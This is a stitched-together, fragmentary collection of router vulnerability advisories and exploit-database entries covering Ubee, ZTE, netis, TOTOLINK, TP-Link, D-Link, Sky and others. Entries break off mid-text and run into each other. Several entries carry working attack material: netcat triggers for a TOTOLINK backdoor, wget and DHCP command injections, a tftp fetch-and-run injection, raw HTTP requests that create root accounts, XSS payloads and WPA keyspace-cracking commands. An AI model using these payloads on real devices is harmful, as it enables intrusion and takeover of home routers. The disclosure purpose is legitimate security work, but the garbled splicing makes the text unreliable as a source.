without authentication from LAN until the next reboot.
Since the backup file is not encrypted and contains the plain admin
password, the router can be compromised from LAN.
POC:
Authentication bypass (backdoor)
The web interface bypasses authentication if the HTML request contains
the factoryBypass parameter. In this case a valid session is created and
the attacker can gain full control over the device.
POC:
Arbitrary code execution
The configuration file restore function receives a compressed tar file,
which is extracted to the /tmp folder. Tar files may contain symbolic
links, which can link out from the extraction folder. By creating a
configuration file with a symbolic link and a folder which uses this
link, the attacker can write out from the backup folder and can
overwrite any file in the writable file-system.
Since www is copied to the writable file system at boot time (under
/tmp), the attacker can insert a new cgi script that executes arbitrary
code with root privileges.
Default SSID and passphrase can be calculated
The default SSID and passphrase are derived only from the MAC address.
Since the MAC address of the device is broadcasted via WiFi, the default
password can be calculated easily.
Combined with code execution and factory bypass, even a botnet of Ubee
routers can be deployed easily.
Buffer overflow in configuration restore
During the configuration restore process, the backup file password is
read from the pass.txt file. If the password is large enough (larger
than 65536), a stack based buffer overflow is caused, because the file
content is loaded with fscanf(“%s”) to a stack based local variable. The
stack based buffer overflow can be used to execute arbitrary code with
root privileges.
Buffer overflow in configuration file request
The web interface identifies the configuration file download request by
checking that the URL contains the Configuration_file.cfg string. If
this string is found, the whole URL is copied into a stack based buffer,
which can cause a buffer overflow. This stack based buffer overflow can
be used to execute arbitrary code with root privileges without
authentication.
POC:
Buffer overflow in next file name
The gonext variable in the POST requests specifies the HTML file, which
the cgi script should be loaded. If the gonext variable is large enough
(larger than 6512 bytes), a stack based buffer overflow is caused, which
can be used to execute arbitrary code with root privileges without
authentication.
Communication on the UPC Wi-Free can be sniffed within the device
The UPC Wi-Free communication is not separated correctly inside the
device, because the whole communication can be sniffed after gaining
root access to the device.

#authentication after you attempt to login after already having failed a login. That webpage, loginpserr.stm contains the md5 hash value of the administrators password. This can be
#exploited by extracting that hash value, and passing it in the pws field in a post request to
#login.cgi.
#I would like to note that I contacted Belkin on several occasions
#and gave them plenty of time to reply/fix the issue before releasing this entry.
#2. Proof:
#Line 55 of loginpserr.stm contains the javascript code:
#var password = ""md5hashofpassword"";

# Category: Remote
# Tested on: Magnet Networks Tesley CPVA 642","The Tesley CPVA 642 routers supplied by Magnet Networks are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
• Starts with MAGNET0
• Adds six random numerical digits
• 1 million possible combinations ( MAGNET0000000 – MAGNET0999999 )
The entire keyspace can be generated using “mask processor” by ATOM, piping each letter out to its own file, for example:
./mp32 MAGNET0?1?1?1?1?1?1 > magnet_networks_tesley_ks.txt
The .txt file weighs in at around 45mb.
Using a 1.4ghz i3 processor on a budget laptop, we were hitting 1,000 keys per second.  Breakdown below:
• 1,000,000 / 1,000 keys per second = 1,000 seconds
• 1,000 / 60 seconds = 16~ minutes
The WPA-PSK handshake we used has the password MAGNET0349325 and was cracked within ~6 minutes.
If you’re using the default password on your Magnet Networks Tesley CPVA 642 Router, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols.
On the 20th of June 2016, Magnet Networks Customer Care confirmed via email that these routers are not used by Magnet Networks anymore."

CVE: CVE-2014-2045
Vendor: Viprinet
Product: Multichannel VPN Router 300
Affected version: 2013070830/2013080900
Fixed version: 2014013131/2014020702
Reported by: Tim Brown
Details:
The data supplied to both the `old’ and `new’ web applications (the device has two web based management interfaces) was permanently stored and could be retrieved later by other users. This is a normal feature of many applications, however, in this instance the application failed to restrict the type of data that could be stored and also failed to sanitise it, meaning that it could not be safely rendered by the browser.
Stored cross-site scripting could be triggered by:
Attempting to login with a username of `<script>alert(1)</script>’ (affects `old’ interface and results in post-authentication cross-site Scripting when a legitimate administrator views the realtime log)
Creating an account with a username of `<script>alert(1)</script>’ (affects both `old’ and `new’ interfaces once created)
Setting the device’s hostname to `<script>alert(1)</script>’  (affects `old’ interface once created)
A number of locations were identified as being vulnerable to reflective attacks, including:
The inclusion of session IDs in all URLs partially mitigates the reflective cross-site scripting but could itself be considered a vulnerability since it is included in referred headers and log files.
These are simply some examples of how this attack might be performed, and the it is believed that both the `old’ and `new’ web applications are systemically vulnerable to this.

# Title: Aztech Modem Broken Session Management Exploit
# Author: Eric Fajardo - fjpfajardo@ph.ibm.com
# A successful authentication of a privilege (admin) ID in the
# web portal allows any attacker in the network to hijack and
# reuse the existing session in order to trick and allow the web
# server to execute administrative commands. The command may be
# freely executed from any terminal in the network as long as
# the session of the privilege ID is valid. The below PoC shows
# an un-authenticated request to the web server for an administrator
# and user password reset.
# This exploit was tested working with the following modems:
# - DSL5018EN(1T1R) from Globe Telecom
# - DSL705E
# - DSL705EU","Multiple Aztech Modem Routers are prone to a session-hijacking vulnerability.
An attacker can exploit this issue to gain unauthorized access to the affected device.

Overview
ZTE ZXHN H108N R1A router, version ZTE.bhs.ZXHNH108NR1A.h_PE, and ZXV10
W300 router, version W300V1.0.0f_ER1_PE, contain multiple vulnerabilities.
*CVE-ID*:
CVE-2015-7248
CVE-2015-7249
CVE-2015-7250
CVE-2015-7251
CVE-2015-7252
*Note*: Large deployment size, primarily in Peru, used by TdP.
Description
*CWE-200* <https://cwe.mitre.org/data/definitions/200.html>*: Information
Exposure* - CVE-2015-7248
Multiple information exposure vulnerabilities enable an attacker to obtain
credentials and other sensitive details about the ZXHN H108N R1A.
A. User names and password hashes can be viewed in the page source of
PoC:
Login Page source contents:
...snip....
var G_UserInfo = new Array();
var m = 0;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""admin""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped/; //Password Hash seen here
G_UserInfo[m][2] = ""1""; //Level
G_UserInfo[m][3] = ""1""; //Index
m++;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""user""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped""; //Password Hash seen here
G_UserInfo[m][2] = ""2""; //Level
G_UserInfo[m][3] = ""2""; //Index
m++;
G_UserInfo[m] = new Array();
G_UserInfo[m][0] = ""support""; //UserName
G_UserInfo[m][1] = ""$1$Tsnipped""; //Password Hash seen here
G_UserInfo[m][2] = ""2""; //Level
G_UserInfo[m][3] = ""3""; //Index
m++;
...snip...
B. The configuration file of the device contains usernames, passwords,
keys, and other values in plain text, which can be used by a user with
lower privileges to gain admin account access. This issue also affects ZTE
ZXV10 W300 models, version W300V1.0.0f_ER1_PE.
*CWE-285* <https://cwe.mitre.org/data/definitions/285.html>*: Improper
Authorization* - CVE-2015-7249
By default, only admin may authenticate directly with the web
administration pages in the ZXHN H108N R1A. By manipulating parameters in
client-side requests, an attacker may authenticate as another existing
account, such as user or support, and may be able to perform actions
otherwise not allowed.
PoC 1:
1. Login page user drop-down option shows only admin only.
2. Use an intercepting proxy / Tamper Data - and intercept the Login submit
request.
3. Change the username admin to user / support and continue Login.
4. Application permits other users to log in to mgmt portal.
PoC 2:
After logging in as support, some functional options are visibly
restricted. Certain actions can still be performed by calling the url
directly. Application does not perform proper AuthZ checks.
Following poc is a change password link. It is accessible directly, though
it (correctly) is restricted to changing normal user (non-admin) password
only.
<IP>/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=accessctrl&var:subpage=accountpsd
Other functions / pages may also be accessible to non-privileged users.
*CWE-22* <http://cwe.mitre.org/data/definitions/22.html>*: Improper
Limitation of a Pathname to a Restricted Directory ('Path Traversal') *-
CVE-2015-7250
The webproc cgi module of the ZXHN H108N R1A accepts a getpage parameter
which takes an unrestricted file path as input, allowing an attacker to
read arbitrary files on the system.
Arbitrary files can be read off of the device. No authentication is
required to exploit this vulnerability.

Belkin N150 wireless router firmware versions 1.00.07 and earlier contain a
path traversal vulnerability through the built-in web interface. The
webproc cgi
module accepts a getpage parameter which takes an unrestricted file path as
input. The web server runs with root privileges by default, allowing a
malicious attacker to read any file on the system.
A patch was released by Belkin but that is still vulnerable.

<V N=""USERRIGHT"" V=""0x1""/>
<V N=""INSTNUM"" V=""0x3""/> </chain>
2. *Backdoor accounts*
The device comes configured with privileged, backdoor account.
For HTTP, 'guest' with attribute <V N=""BACKDOOR"" V=""0x1""/>, is the backdoor
account. This is seen in the config file:
<chain N=""USERNAME_PASSWORD"">
<V N=""FLAG"" V=""0x0""/>
<V N=""USERNAME"" V=""guest""/>
<V N=""PASSWORD"" V=""XXXXairocon""/>
<V N=""BACKDOOR"" V=""0x1""/>
<V N=""PRIORITY"" V=""0x1""/>
</chain>
This user is not shown / visible in the user list when logged in as guest
(privileged user).
3. *No CSRF protection*
There is no CSRF token set in any of the forms / pages.
It is possible to silently execute HTTP requests if the user is logged in.
4. *Weak RBAC controls *
5a) *A non-root/non-admin user (user) can create and delete any other
users, including root-privileged accounts. *
In netis RealTek wireless router ADSL modem, there are three users:
guest:guest -> priv 2 is super user account with full functional access
user:user -> priv 0 -> can access only some functions
guest:XXXXairocon -> privileged backdoor login
*Normally: *
- user can create new account with restricted user privs only.
- user can change its password and only other non-root users.
- user can delete any other non-root users.
However, the application does not enforce strict rbac and it is possible
for a non-root user to create a new user with root privileges.
This is done as follows:
1. Start creating a new user, and intercepting the user creation POST
request
2. Intercept & Change privilege parameter value from 0 (user) to 2 (root) -
Submit request
3. When the new root user is created successfully, it does not show up in
user list
4. Confirm via logging in as new root, and / or configured accounts in
configuration file (config.img)
This is the POST request to create a new user:
*Create user http request*:
POST /form2userconfig.cgi HTTP/1.1
Host: <IP>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1

Content-Type: application/x-www-form-urlencoded
Content-Length: 115
username=test&privilege=2&newpass=test&confpass=test&adduser=Add&hiddenpass=&submit.htm%3Fuserconfig.htm=
*Note1*: In some cases, this password change function is not accessible to
'user' via GUI. But we can still send a POST request to create a valid, new
root privileged account.
*Note2*: In some cases, application does not create root priv user, in the
first attempt. However, in the 2nd or 3rd attempt, new user is created
without any issue.
*Delete user http request:*
A non-root/non-admin user can delete any configured user(s) including
privileged users (guest).
POST /form2userconfig.cgi HTTP/1.1
Host: <ip>
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101
Firefox/38.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1

Content-Type: application/x-www-form-urlencoded
Content-Length: 131
username=test&privilege=2&oldpass=&newpass=&confpass=&deluser=Delete&select=s3&hiddenpass=test&submit.htm%
In case (non-root) user is deleting a root login (guest, priv 2), action
status can be confirmed by checking the configuration In case (non-root)
user is deleting a user login (priv 0), action status can be confirmed by
checking the user list.
5b) *(non-root priv) User can access unauthorized functions.*
Normally, 'user' does not have access to all the functionality of the
device. It has access to Status, Setup and Maintenance.
However, few functions can still be accessed by calling them directly. For
example, to access the mac filtering configuration this url can be opened
directly:
Other functions may also be accessible in this manner.
6. *Sensitive information not secured from low privileged users *
A non-root / non-admin privileged user has access to download the
configuration file - config.img.
This file contains clear-text passwords, keys and other sensitive
information which can be used to gain privileged access.
7. *Sensitive information accessible in clear-text*
Sensitive Information like passwords and keys are not secured properly.
Mostly these are either shown in clear-text or cen censored *****, it is
possible to view clear-text values by 'Inspect Element' locally or
intercepting http requests, or sniffing.

*Vehicle 3G Wi-Fi Router - PIXORD *
*Device Info *
Model Name :3GR-431P
Software Version :RTA-A001_02
Wireless Driver Version :2.6.0.0
PiXORD 3GR-431P 3G Wi-Fi Router is a 3G + GPS + 802.11n (2T2R) wireless
router. It supports Internet access via 3G and receives position
information from GPS. 3GR-431P also supports two Ethernet ports for LAN
connectivity and 802.11n Wi-Fi Access Point for WLAN connectivity.
It is available to install the 3GR-431P on the transportation. The
passengers can use the laptop or smart phone via Wi-Fi to browse the
Internet on the go. The Ethernet port also can connect IP camera to provide
the real time monitoring.
Vulnerability Impact: Easy and full device compromise. Access to configured
keys, passwords, pass-phrases, accounts, etc. Ability to monitor the user /
vehicle via camera / connected devices.
*Multiple Security Vulnerabilities *

As seen above, only few specific, functional options are available for
device management.
However, we can bypass this and dump hashes easily.

support:<password2>:0:0:Adminstrator:/:/bin/sh

> exit
Note that this is also applicable when a non-admin ‘user’ / ‘support’ logs
in over the Telnet.
The web application lacks strict input validation and hence vulnerable to
OS command injection attack.
*2. Configuration not secured properly / AuthZ issues *
The device has three users - admin, support, user.
Apparently, there is no separation of privileges between these 3 users,
when accessing over HTTP(S). All options are available to all three then.
This allows 'user' /'support' to access device configuration file -
RT2880_Settings.dat. Configuration backup contains b64-encoded login
passwords + clear-text WPA keys + other sensitive information.
.. …
*Sensitive information in configuration file - *
*more RT2880_Settings.dat *

Also, as observed in point 1 above, all the users have a UID 0, i.e. root
level privileges to the device:
admin:<password1>:0:0:Adminstrator:/:/bin/sh
support:<password2>:0:0:Adminstrator:/:/bin/sh
user:<password3>:0:0:Adminstrator:/:/bin/sh
The application should ideally provide specific privileges to different
users, and enforce strict access control.
*3. Application does not secure configured passwords (HTTPS) *
Masked password(s) can be retrieved via frame source (inspect element) and
/ or intercepting request via a proxy.
The application should mask/censure (*****) the passwords, keys and any
other crucial pieces of configuration and must not pass the values in
clear-text.
*4. Program / Scripts running in an insecure manner - leaking clear-text
passwords in process information *
After logging in to the device over Telnet, we can drop in to a shell via
OS command injection attack described in point 1.

Exploitation Technique:
Remote
Severity Level:
High
Technical Details & Description:
An authentication bypass vulnerability has been discovered in the official in the official Zhone ADSL2+ 4 Port Wireless Bridge & Router (Broadcom).
The vulnerability allows remote attackers to bypass the authentication procedure to compromise the hardware device or service interface.
The first vulnerability is located in the session validation when processing to request via GET (outside the network) the `pvccfg.cgi`,`dnscfg.cgi`
and `password.cgi` files. Thus can results in a reconfiguration by the attacker to compromise the hardware device.
The second vulnerability is located in the backupsettings.conf file access rights. Remote attackers can easily request via curl the backupsettings
of the hardware device. Thus can result in an easy take-over of the hardware device via an information disclosure by accessing the backupsettings.conf.
The security risk of both vulnerabilities are estimated as high with a cvss (common vulnerability scoring system) count of 8.8. Exploitation of the access
privilege issue requires no privilege application user account or user interaction. Successful exploitation of the bug results in hardware device compromise.

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
A backdoor is present in several TOTOLINK products.
This was confirmed by analysing the latest firmwares and by testing
the backdoor against live routers.
At least 8 TOTOLINK products are affected (firmwares come from
totolink.net and from totolink.cn):

By sending a crafted request to the WAN IP, an attacker will open the
HTTP remote management interface on the Internet.
Then an attacker can use a Remote Code Execution in the HTTP remote
management interface by using the hidden /boafrm/formSysCmd form,
bypassing the authentication system.
We estimate there are =~ 50 000 routers affected by this backdoor.
The init.d script executes the /bin/skt binary when the router starts:
cat etc/init.d/rcS
boa
skt&
skt is a small MIPS binary which is a client/server program. The arguments are:
server: ./skt
client: ./skt host cmd
The binary can be used in x86_64 machines using QEMU: sudo chroot .
./qemu-mips-static ./bin/skt
Using skt without argument will launch a TCP daemon on port 5555 in
every interface (including WAN), acting as an ECHO server.
Using skt with arguments will send a TCP packet containing the command
to the specified IP on port 5555.
The analysis of the binary running on the TOTOLINK devices (for more
details, read
) shows the server mode responds to 3 commands by silently executing
system() in the background:
o By sending ""hel,xasf"" to the device, the device will execute:
iptables -I INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
This will open the HTTP remote management interface on port 80 in
the eth1 interface which is the WAN interface by default.
o By sending ""oki,xasf"" to the device, the device will execute:
iptables -D INPUT -p tcp --dport 80 -i eth1 -j ACCEPT
This will close the HTTP remote management interface.
o By sending ""bye,xasf"" to the device, the device will do nothing
The iptables commands in the backdoor are hardcoded with ""eth1"".
Only devices using DHCP and static IP connections are affected because
the WAN IP is attached on the eth1 device.
It does not affect devices using PPPoE connections, because the WAN IP
is attached on the ppp device, as seen below:
totolink# ifconfig
ppp0      Link encap:Point-to-Point Protocol
inet addr:X.X.X.X  P-t-P:X.X.X.X  Mask:255.255.255.255

collisions:0 txqueuelen:64
RX bytes:2803138455 (2.6 GiB)  TX bytes:277402492 (264.5 MiB)
An attacker can use these simple netcat commands to test the backdoor:
To open the HTTP remote management interface on the Internet:
echo -ne ""hel,xasf"" | nc <ip> 5555
To close the HTTP remote management interface on the Internet:
echo -ne ""oki,xasf"" | nc <ip> 5555
To detect a vulnerable router:
echo -ne ""GET / HTTP/1.1"" | nc <ip> 5555
if you see ""GET / HTTP/1.1"" in the answer, you likely detected a
vulnerable router.
A hidden form in the latest firmware allows an attacker to execute
commands as root by sending a HTTP request:
POST /boafrm/formSysCmd HTTP/1.1
sysCmd=<cmd>&apply=Apply&msg=
An attacker can use wget to execute commands in the remote device:
wget --post-data='sysCmd=<cmd>&apply=Apply&msg='
For instance, sending this HTTP request to the management interface
will reboot the device:
POST /boafrm/formSysCmd HTTP/1.1
sysCmd=reboot&apply=Apply&msg=
This wget command will do the same job:
wget --post-data='sysCmd=reboot&apply=Apply&msg='

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
Backdoor credentials are present in several TOTOLINK products.
It affects 4 TOTOLINK products (firmwares come from totolink.net and
from totolink.cn):
G150R-V1 : last firmware 1.0.0-B20150330

N301RT-V1 : last firmware 1.0.0 (TOTOLINK N301RT_V1.0.0.web)
It allows an attacker in the LAN to connect to the device using telnet
with 2 different accounts: root and 'onlime_r' which gives with root
privileges.
The init.d script executes these commands when the router starts:
cp /etc/passwd_orig /var/passwd
cp /etc/group_orig /var/group

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
TOTOLINK iPuppy, iPuppy3, N100RE and N200RE are wireless LAN routers.
Their current firmwares with default configuration are
vulnerable to CSRF-attacks and XSS attacks.
Since, the anti-CSRF protection is based on a static HTTP referrer
(RFC 1945), an attacker can take over
most of the configuration and settings using anyone inside the LAN of
the router. Owners are urged to
contact TOTOLINK, and activate authentication on this product
(disabled by default).
It affects (firmware come from totolink.net and from totolink.cn):
TOTOLINK iPuppy : firmware 1.2.1 (TOTOLINK iPuppy__V1.2.1.update)
TOTOLINK iPuppy3 : firmware 1.0.2 (TOTOLINK iPuppy3_V1.0.2.update)
TOTOLINK N100RE-V1 : firmware V1.1-B20140723-2-432-EN
(TOTOLINK-N100RE-IP04216-RT5350-SPI-1M8M-V1.1-B20140723-2-432-EN.update)
TOTOLINK N200RE : firmware V1.4-B20140724-2-457-EN
(TOTOLINK-N200RE-IP04220-MT7620-SPI-1M8M-V1.4-B20140724-2-457-EN.update)
The HTTP interface allows to edit the configuration. This interface is
vulnerable to CSRF.
Configuration and settings can be modified with CSRF attacks:
Activate the remote control management
Change the DNS configuration
Update the firmware
Change the Wifi Configuration
Create TCP redirections to the LAN
and more...
Example of forms exploiting the CSRF:
o Activating the remote control management on port 31337/tcp listening
on the WAN interface.

TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
markets in South Korea.
TOTOLINK produces routers routers, wifi access points and network
devices. Their products are sold worldwide.
The first vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single HTTP request.
The second vulnerability allows to bypass the admin authentication and
to get a direct RCE from the LAN side with a single DHCP request.
There are direct RCEs against the routers which give a complete root
access to the embedded Linux from the LAN side.
The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to
the latest firmwares with the default configuration:
- TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
- TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
- TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin
- totolink.net)
- TOTOLINK EX300 : until last firmware (9.36 -
ex300_ch_9_36.bin.5357c0 - totolink.cn)
- TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
- TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
- TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
- TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
- TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
- TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK
N302R Plus V1_en_8_82.bin)
- TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK
N302R Plus V2_en_9_08.bin)
- TOTOLINK A3004NS (no firmware available in totolinkusa.com but
ipTIME's A3004NS model was vulnerable to the 2 RCEs)
- TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)
The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares
to the latest firmwares with the default configuration:
- TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
- TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)
Firmwares come from totolink.net and from totolink.cn.
- - From my tests, it is possible to use these vulnerabilities to
overwrite the firmware with a custom (backdoored) firmware.
Concerning the high CVSS score (10/10) of the vulnerabilities and the
longevity of this vulnerability (6+ year old),
the TOTOLINK users are urged to contact TOTOLINK.
The HTTP server allows the attacker to execute some CGI files.
Many of them are vulnerable to a command inclusion which allows to
execute commands with the http daemon user rights (root).
Exploit code:
$ cat totolink.carnage
if [ ! $1 ]; then
echo ""Usage:""
echo $0 ip command
exit 1
fi
wget -qO- --post-data=""echo 'Content-type:

An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.
By the way, d.cgi in /bin/ is an intentional backdoor.
This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD
server in TOTOLINK devices allows remote attackers to execute
arbitrary commands
via shell metacharacters in the host-name field.
Sending a DHCP request with this parameter will reboot the device:
cat /etc/dhcp/dhclient.conf
send host-name "";/sbin/reboot"";
When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we
will see the stdout of the /dev/console device;
the dhcp request will immediately force the reboot of the remote device:

An attacker can use the /usr/bin/wget binary located in the file
system of the remote device to plant a backdoor and then execute it as
root.
Due to ""un-ethical code"" found in TOTOLINK products (= backdoors found
in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
case, but ipTIME was contacted in April 2015 concerning the first RCE.
* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in
ipTIME products.
* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and
EX750 routers.
* Jul 13, 2015: Updated firmwares confirmed vulnerable.
* Jul 16, 2015: A public advisory is sent to security mailing lists.
These vulnerabilities were found by Alexandre Torres and Pierre Kim

+ Conclusion:
This vulnerability can be exploited remotely and it should be patched as soon as possible. An attacker could be monitoring our network
or even worse being a member of a botnet without knowledge of it.
First mitigation could be  either try to update the last version for these routers or install 3rd parties firmwares as OpenWRT or DDWRT on them.

# Date: 08/08/2014
# Author: Matt O'Connor / Planit Computing
# Advisory Link:  http://www.planitcomputing.ie/sky-wifi-attack.pdf
# Version:
# Category: Remote
# Tested on: Sky SR101 Router","The SR101 routers supplied by Sky Broadband are vulnerable to an offline dictionary attack if the WPA-PSK handshake is obtained by an attacker.
The WPA-PSK pass phrase has the following features:
Random
A to Z Uppercase only
8 characters long
208,827,064,576 possible combinations ( AAAAAAAA  ZZZZZZZZ ) 26^8
We notified Sky Broadband about the problem in January 2014 yet Sky Broadband are still supplying customers with routers / modems that use this weak algorithm.
At the time, graphics cards were expensive and clustering several machines was not financially viable to the average hacker.
We purchased a used rig in December 2013, comprising off:
Windows 7
I3 Processor
4GB RAM
2TB Drive
Radeon HD 5850
We generated 26 dictionary files using mask processor by ATOM, piping each letter out to its own file, for example:
A:  ./mp32 A?u?u?u?u?u?u?u > A.TXT = AAAAAAAA  AZZZZZZZ
B: ./mp32 B?u?u?u?u?u?u?u > B.TXT = BAAAAAAA  BZZZZZZZ
etc
Each .txt file weighed in at around 60GBs each.  The 26 files took up about 1.6TB of storage.
We now had the complete key space, partitioned into 26 different files.  This allowed us to distribute the brute force attack amongst multiple computers.  There are other ways with ocl-hashcat but this was the simplest.
Using our Radeon HD5850 on standard settings, we were hitting 80,000 keys per second.  Breakdown below:
26^8 = 208,827,064,576 ( 208 billion possible combinations )
26^8 / 80,000 keys per second = 2,610,338 seconds
2,610,338 / 60 seconds = 43,505 minutes
43,505 / 60 minutes = 725 hours
725 hours / 24 hours = 30 Days
For 185, we had built a computer that could crack the default Sky Broadband wireless password within 30 days.  The WPA-PSK handshake we used started with the letter S and was cracked within 96 hours.
We ended up getting a second machine for the same price which resulted in our maximum cracking time being reduced to 15 days.
If youre using the default password on your Sky Broadband connection, we recommend changing it immediately to a more secure password, using a mix of letters, numbers and symbols."

Vulnerability description:
The domain name parameters of the ""Parental Control"" and ""Access
Control"" features of the TP-Link TL-WR740N v4 (FW-Ver. 3.16.6 Build
130529 Rel.47286n) router are prone to arbitrary shell command execution
as root for users who are authenticated against the web interface.
Each shell payload is restricted up to 28 bytes. The ""Parental Control""
feature allows you to specify 8 domains (= 8 commands) so you have 8 x
28 = 244 bytes of shell commands. This is sufficient to post-load and
execute a shell script of arbitrary length from a tftp server.
Employing this method one can gain full control over the device when
post-loading a mightier busybox MIPS binary and executing telnetd or
using netcat to connect back. Default login credentials are known to be
root:5up, Admin:5up or ap71:.
Technical Cause:
The web interface and the whole routing logic on the device is
controlled by a single homebrew process (httpd) running as root.
This binary is employing various fopen() and system() calls in order to
configure the device.
One of these calls refers to a script (/tmp/wr841n/parent.sh) being
filled with user input data from the ""Parental Control"" mask.
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls USER INPUT
HERE,return1 -j RETURN
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ANOTHER USER
INPUT HERE,return1 -j RETURN
The input data is only poorly checked by some JavaScript functions but
the server accepts most characters. Entering a shell command surrounded
by ';' will result in code execution:
iptables -A FORWARD_PARENTCTRL -i br0 -m mac --mac-source
00:AF:FE:22:FE:AF -p tcp --dport 80 -m multiurl --urls ;tftp -gr a
192.168.0.1;,;sh a;,return1 -j RETURN
The same goes for the Access Control Feature. The only difference is
that the script name is /tmp/wr841n/accessCtrl.sh.
The attack is persistent until resetting the parental control or access
control settings. After rebooting the device will execute the commands
again.
This vulnerability may or may not affect other TP-Link hardware and
software versions. However it was only tested against TP-Link TL-WR740N
v4 (FW-Ver. 3.16.6 Build 130529 Rel.47286n) within the local network.
Exploit POC code description:
The exploit tries to load and execute a shell script called 'a' (for
attack) from the specified tftpd server. This is for the circumventing
the length restriction of 28 bytes and the fact that the preloaded
busybox binary is a bit restricted (no netcat and telnetd available).
The 'a' script then loads a mightier busybox (filename busyboxx) binary
from the tftp server specified in that 'a' script (default 192.168.0.1).
It also sets up a more comfortable environment and starts telnetd as
well as a ftp server.
You can then connect to the router via telnet and ftp.
The exploit code is written in C# (.NET 4.5) so you need .NET Framework
4.5 to execute it.
Usage:
ParentalControlExploit.exe [/a | /p] [RouterIp] [RouterWebIfaceUsername]
[RouterWebIfacePassword] [TFTPServerIp]

History of the flaw:
07/01/2014    -    Found it
07/05/2014    -    Notified TP Link via their Online Support Contact
form including detailed description and link to POC exploit
07/14/2014    -    Got answer via mail that they could not reproduce the
flaw via the router's web interface and asked for more information.
07/26/2014    -    Replied to TP-Link that one cannot reproduce the bug
via the router's web interface due to the javascript ""check logic"" and
that they need to either employ direct GET requests or use the provided
exploit
07/29/2014    -    TP Link states that this was no security flaw because
the attacker had to know the credientials to the webinterface. It was
like giving the key to your flat to a housebreaker.

Sensitive Information Disclosure - CWE - CWE-200: Information Exposure
The D-Link models DGL-5500, DIR-855L, DIR-835 suffer from a
vulnerability which an unauthenticated person can gain access the
sensitive files:
curl -s curl -s http://<IP>:8080/HNAP1/
On the DIR-652  and DHP-1565, a user needs authentication first to
gain access to these files.
But more importantly, an unauthenticated user can browse directly to
MBS MIPS file. The file contains most of the devices internal working
structure and sensitive information. These particular routers use  a
MSB EM_MIPS Processor and it does contain executable components.
The file can be accessed through at least one known cgi file, however
there maybe others. Although no known publicly working example exist
to my knowledge, unpatched devices are susceptible to injection of
malicious code and most likely susceptible to a payload which could
deploy a self-replicating worm.
These items were reported to D-Link on April 20th, and to US Cert on
April 21. D-Link does have patches available for all affected models,
and it is highly recommended to update the device's firmware as soon
as possible.

SAP Router Password Timing Attack
1. *Advisory Information*
Title: SAP Router Password Timing Attack
Advisory ID: CORE-2014-0003
Advisory URL:
Date published: 2014-04-15
Date of last update: 2014-03-06
Vendors contacted: SAP
Release mode: Coordinated release
2. *Vulnerability Information*
Class: Information Exposure Through Timing Discrepancy [CWE-208]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2014-0984
3. *Vulnerability Description*
SAP Router [1]  is an application-level gateway used to
connect systems in a SAP infrastructure. A vulnerability
have been found in SAP Router that could allow an unauthenticated
remote attacker to obtain passwords used to protect route entries
by a
timing side-channel attack.
4. *Vulnerable Packages*
. SAP Router release 721 patch level 117.
. SAP Router release 720 patch level 411.
. SAP Router release 710 patch level 029.
. Other versions are probably affected too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
SAP released the security note
regarding these issues. Contact SAP for further information.
Martin Gallo proposed the following actions to mitigate the
impact of the vulnerabilities:
